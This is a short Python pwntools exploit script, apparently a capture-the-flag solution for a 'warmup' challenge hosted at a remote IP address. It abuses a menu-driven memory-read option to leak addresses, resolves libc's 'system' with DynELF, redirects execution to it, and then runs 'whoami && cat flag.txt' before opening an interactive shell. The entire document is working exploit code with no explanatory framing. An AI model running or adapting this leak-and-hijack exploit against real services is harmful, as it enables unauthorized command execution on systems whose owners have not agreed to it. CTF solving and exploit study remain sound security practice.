#!/usr/bin/env python3

from pwn import *

# r = process('./warmup')
r = remote('34.124.157.94', 32112)

addr_leak = int(r.recvline().decode().rstrip().split(': ')[1], 16)
log.info('addr_leak: {:#x}'.format(addr_leak))

def leak(addr):
    r.sendlineafter(b'choice: ', b'1')
    r.sendlineafter(b'(hex): ', hex(addr).encode())
    return p64(int(r.recvline().decode().rstrip().split(': ')[1], 16))

d = DynELF(leak, addr_leak)
system = d.lookup('system', 'libc')
log.info('system: {:#x}'.format(system))

# Win
r.sendlineafter(b'choice: ', b'2')
r.sendlineafter(b'): ', hex(system).encode())
sleep(0.1)
r.sendline(b"whoami && cat flag.txt")

r.interactive()
r.close()
